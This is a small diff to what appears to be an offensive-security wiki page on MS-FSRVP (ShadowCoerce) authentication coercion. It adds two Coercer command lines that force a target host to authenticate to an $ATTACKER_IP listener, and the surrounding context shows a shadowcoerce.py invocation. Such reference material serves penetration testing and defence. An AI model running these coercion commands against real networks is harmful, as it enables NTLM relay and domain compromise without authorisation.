@@ -47,7 +47,11 @@ shadowcoerce.py -d "domain" -u "user" -p "password" LISTENER TARGET
 Another alternative is to use the [Coercer](https://github.com/p0dalirius/Coercer/tree/master) tool (python) as follow.
 
 ```bash
+# Coerce
 coercer coerce -u $USER -p $PASSWORD -d $DOMAIN --filter-protocol-name MS-FSRVP -l $ATTACKER_IP -t $TARGET_IP
+
+# Coerce a specific method
+coercer coerce -u $USER -p $PASSWORD -d $DOMAIN --filter-method-name IsPathSupported -l $ATTACKER_IP -t $TARGET_IP
 ```
 {% endtab %}
 {% endtabs %}
